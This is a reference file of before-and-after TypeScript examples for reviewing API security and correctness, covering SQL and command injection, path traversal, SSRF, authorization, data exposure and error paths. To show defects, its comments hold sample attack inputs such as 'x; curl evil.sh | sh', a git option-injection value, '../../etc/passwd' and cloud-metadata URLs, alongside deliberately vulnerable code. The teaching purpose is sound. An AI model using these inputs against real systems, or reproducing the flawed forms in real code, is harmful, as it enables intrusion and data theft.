# API Reviewing - Core Examples

> Before-and-after code for the patterns in [SKILL.md](../SKILL.md), under the same headings. Each example keeps only the lines the defect lives in: `db.query(sql, values)`, `db.transaction(fn)`, `users.update(id, fields)` and `logger` stand for whatever the diff uses, placeholder syntax varies by driver, and a handler's result is written as `{ status, body }`.

---

## Pattern 1: Injection and Server-Side Requests

### SQL values

```typescript
// Must Fix: the search box is part of the statement
const posts = await db.query(
  `SELECT id, title FROM posts WHERE title LIKE '%${query.q}%'`,
);

// The value travels as data, wildcards included
const posts = await db.query(
  "SELECT id, title FROM posts WHERE title LIKE $1",
  [`%${query.q}%`],
);

// A tagged template binds the same way: each ${value} becomes a placeholder
const term = `%${query.q}%`;
const posts = await sql`SELECT id, title FROM posts WHERE title LIKE ${term}`;
```

**Why:** the first form hands the database one string, so a quote in the search box ends the literal and whatever follows runs as SQL. The other two send the statement and the value separately; the tag in front of the template is what makes the difference, so the same characters without it are the first form again.

### SQL identifiers

```typescript
const SORT_COLUMNS = { newest: "created_at", title: "title" } as const;

// Must Fix: the request writes part of the statement
const posts = await db.query(
  `SELECT id, title FROM posts ORDER BY ${query.sort}`,
);

// The request picks a key; the code supplies the identifier
const column = SORT_COLUMNS[sortSchema.parse(query.sort)];
const posts = await db.query(`SELECT id, title FROM posts ORDER BY ${column}`);
```

**Why:** a placeholder binds a value, and a column name is part of the statement's structure, so the only safe source for one is the code. The second query is a grep hit for an interpolated template and still fine — the value came from the allowlist.

### Processes

```typescript
import { exec, execFile } from "node:child_process";

// Must Fix: "x; curl evil.sh | sh" in the URL runs as a second command
exec(`git clone ${repoUrl} ${targetDir}`);

// Still Must Fix: "--upload-pack=touch /tmp/pwned" is read as an option
execFile("git", ["clone", repoUrl, targetDir]);

// Option-shaped input is refused, and "--" ends option parsing before it
if (!isHttpsUrl(repoUrl)) return badRequest();
execFile("git", ["clone", "--", repoUrl, targetDir]);
```

**Why:** the argument array keeps the shell out, so metacharacters are inert, but git still parses its own arguments and reads a value beginning with `-` as an option. Requiring an `https:` URL rules out a leading `-`, and `git clone` documents `[--]` before the repository. Programs differ on whether they honour `--`; refusing a leading `-` works for all of them.

### File paths

```typescript
import { join, resolve, sep } from "node:path";

const UPLOAD_ROOT = resolve("uploads");

// Must Fix: "../../etc/passwd" leaves the root; join normalises ".." rather than refusing it
const unsafePath = join(UPLOAD_ROOT, params.name);

// Resolved, then confirmed to sit inside the root
const filePath = resolve(UPLOAD_ROOT, params.name);
if (!filePath.startsWith(UPLOAD_ROOT + sep)) return notFound();
```

**Why:** the trailing separator is load-bearing — `"/srv/uploads-old/x".startsWith("/srv/uploads")` is true. Where the directory can hold symlinks, pass the resolved path through `realpath` before the check, or a link inside the root leads out of it.

### Outbound requests

```typescript
const CALLBACK_HOSTS = new Set(["hooks.example.com"]);

// Must Fix: the server fetches http://169.254.169.254/ or http://localhost:6379 for anyone who asks
await fetch(body.callbackUrl);

// body.callbackUrl has passed the schema's URL check, so new URL cannot throw
const target = new URL(body.callbackUrl);
if (target.protocol !== "https:" || !CALLBACK_HOSTS.has(target.hostname)) {
  return badRequest();
}
await fetch(target, { redirect: "error" });
```

**Why:** a denylist of private ranges loses to other spellings of the same address — `http://2130706433/` is `127.0.0.1` — and to an allowed host that redirects inward, which `redirect: "error"` refuses. Where the destination has to be user-chosen, the check moves to the resolved IP address, and the client connects to the address that was checked rather than resolving again.

---

## Pattern 2: Boundary Validation

```typescript
// Must Fix: "abc" becomes NaN, "-5" a negative offset, and any string reaches the sort
const limit = Number(query.limit);
const offset = Number(query.offset);
const sort = query.sort;

// One schema states the contract, and the handler reads only its output:
// limit an integer from 1 to 100 (default 20), offset an integer >= 0, sort one of two keys
const { limit, offset, sort } = listQuerySchema.parse(query);

// Params get their own schema: an id that is not a UUID is a 400, not a database error
const { id } = documentParamsSchema.parse(params);
```

**Why:** each `Number()` and each raw read moves the failure deeper into the stack, where the error no longer names the field that caused it. Where `parse` throws, the codebase's error handler has to map the validation error to 400 or 422 — without that mapping, every malformed request answers 500. A variant that returns the failure instead of throwing puts that mapping in the handler.

---

## Pattern 3: Authentication and Object-Level Authorization

```typescript
// Must Fix: authenticated is not authorized — any signed-in user reads any document
const [doc] = await db.query(
  "SELECT id, title, body FROM documents WHERE id = $1",
  [params.id],
);

// Ownership is part of the query, and someone else's document answers like a missing one
const [doc] = await db.query(
  "SELECT id, title, body FROM documents WHERE id = $1 AND owner_id = $2",
  [params.id, session.userId],
);
if (!doc) return { status: 404, body: { error: "Not found" } };
```

**Why:** the route's guard established who the caller is; only the `owner_id` condition establishes that this row is theirs. A 403 for a row that exists but belongs to someone else would confirm the id is real, which is why the absent and the forbidden answer alike.

```typescript
// Must Fix: any signed-in user can call this; only the UI hides the button
await users.delete(params.id);

// The server checks the role before acting
if (session.role !== "admin") {
  return { status: 403, body: { error: "Forbidden" } };
}
await users.delete(params.id);
```

**Why:** the UI is one client of the API, and anyone can write another. An admin function whose only check lives in the interface has no check.

---

## Pattern 4: Property-Level Exposure

### What leaves

```typescript
// Must Fix: passwordHash, resetToken and isStaff ship to the browser
return { status: 200, body: user };

// The response shape is chosen, not inherited from the table
return {
  status: 200,
  body: { id: user.id, name: user.name, email: user.email },
};
```

**Why:** a row serialized whole carries every column the table has now and every column added later, so the response grows a field each time the schema does, without anyone deciding it should.

### What enters

```typescript
// Must Fix: sending { "role": "admin" } promotes the caller
await users.update(session.userId, body);

// Still Must Fix when the schema passes unknown keys through
const profile = profileSchema.parse(body); // a loose schema keeps "role"
await users.update(session.userId, profile);

// The write names what a user may change
const { name, email } = profileSchema.parse(body);
await users.update(session.userId, { name, email });
```

**Why:** schema libraries disagree about undeclared keys — some strip them by default, some keep them unless told otherwise, and all of them offer a mode that keeps them. Naming the fields at the write makes the answer irrelevant.

### What gets logged

```typescript
// Must Fix: the password and the session cookie land in the log store
logger.info("login attempt", { body, headers });

// The event is identified, not re-enacted
logger.info("login failed", { userId: account.id, reason: "bad-password" });
```

**Why:** logs are shipped to aggregators, read by more people than the database, and kept longer. Session ids, tokens, passwords, connection strings and personal data stay out of them.

### What sits in source

```typescript
// Must Fix: the key is in every clone of the repository, and in its history
const apiKey = "live_4f9c2e81d07b";

// Read through the codebase's configuration
const apiKey = config.paymentsApiKey;
```

---

## Pattern 5: Error Paths

### What a failure returns

```typescript
// Should Fix: dialect, table names and stack frames reach the client
catch (error) {
  return { status: 500, body: { error: String(error) } };
}

// The client gets a message it can act on; the log gets the detail
catch (error) {
  if (isUniqueViolation(error)) {
    return { status: 409, body: { error: "That email is already registered" } };
  }
  logServerError("signup failed", error);
  return { status: 500, body: { error: "Could not create account" } };
}
```

**Why:** a raw error hands an attacker the schema and the stack, and hands a legitimate client a message it cannot act on. The duplicate email is a failure the caller can fix, so it gets its own status and words; the database being down is not, so it gets neither.

### What a status says

```typescript
// Should Fix: a caller that branches on status reads this as success
return { status: 200, body: { ok: false, error: "Order not found" } };

// The status says what happened; the body says why
return { status: 404, body: { error: "Order not found" } };
```

### What escapes the handler

```typescript
// Must Fix: the error handler never sees this rejection, so no error response
// is sent, and under --unhandled-rejections=throw it ends the process
sendWelcomeEmail(user.email);

// Awaited, so a failure reaches the error handler...
await sendWelcomeEmail(user.email);

// ...or fine: detached on purpose with its own catch, when the response must not wait
sendWelcomeEmail(user.email).catch(logEmailFailure);
```

**Why:** the framework can route only the failures it sees, and a promise the handler neither awaits nor returns is invisible to it — the client gets no error response, and may already hold a success. Since Node 15 the default `--unhandled-rejections` mode is `throw`, so the rejection becomes an uncaught exception and the process ends. A detached task is fine once it handles its own failure, with a `.catch` or through the codebase's documented fire-and-forget helper.

---

## Pattern 6: Query Shape

### N+1

```typescript
// Should Fix: one round trip per order — invisible on seed data, slow at volume
const orders = await db.query(
  "SELECT id, placed_at FROM orders WHERE user_id = $1",
  [session.userId],
);
for (const order of orders) {
  order.items = await db.query(
    "SELECT sku, quantity FROM order_items WHERE order_id = $1",
    [order.id],
  );
}

// One round trip: the database does the join
const ORDERS_WITH_ITEMS = `
  SELECT o.id, o.placed_at, i.sku, i.quantity
  FROM orders o JOIN order_items i ON i.order_id = o.id
  WHERE o.user_id = $1`;
const rows = await db.query(ORDERS_WITH_ITEMS, [session.userId]);
```

### Unbounded reads

```typescript
// Should Fix: returns every post the author will ever write
const posts = await db.query(
  "SELECT id, title FROM posts WHERE author_id = $1",
  [authorId],
);

// Bounded by the validated limit, and ordered so pages are stable
const posts = await db.query(
  "SELECT id, title FROM posts WHERE author_id = $1 ORDER BY id LIMIT $2",
  [authorId, limit],
);
```

### Writes that belong together

```typescript
// Should Fix: 1 + N round trips, and a failure after the first insert leaves an order with no lines
const [order] = await db.query(INSERT_ORDER, [session.userId]);
for (const line of lines) {
  await db.query(INSERT_ORDER_LINE, [order.id, line.sku, line.quantity]);
}

// One transaction, and the lines go in as one multi-row insert
await db.transaction(async (tx) => {
  const [order] = await tx.query(INSERT_ORDER, [session.userId]);
  await tx.orderLines.insertMany(
    lines.map((line) => ({ ...line, orderId: order.id })),
  );
});
```

**Why:** the transaction makes the order and its lines land together or not at all. The multi-row insert keeps the round trips from growing with the number of lines — and that number comes from the request, so it grows with whatever the caller sends unless the schema caps it.
